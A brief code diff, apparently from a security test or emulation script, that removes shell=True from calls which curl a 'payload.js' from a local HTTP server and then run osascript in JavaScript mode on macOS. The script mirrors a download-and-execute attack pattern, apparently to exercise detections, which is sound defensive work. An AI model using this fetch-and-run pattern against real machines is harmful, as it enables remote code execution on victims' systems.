@@ -25,6 +25,6 @@ def main():
     _ = _common.serve_dir_over_http()
 
     log.info("Executing commands to download and execute JavaScript payload")
-    _ = _common.execute_command(["curl", "http://127.0.0.1:8000/payload.js"], shell=True)
+    _ = _common.execute_command(["curl", "http://127.0.0.1:8000/payload.js"])
     sleep(1)
-    _ = _common.execute_command(["osascript", "-l", "JavaScript", "&"], shell=True)
+    _ = _common.execute_command(["osascript", "-l", "JavaScript", "&"])
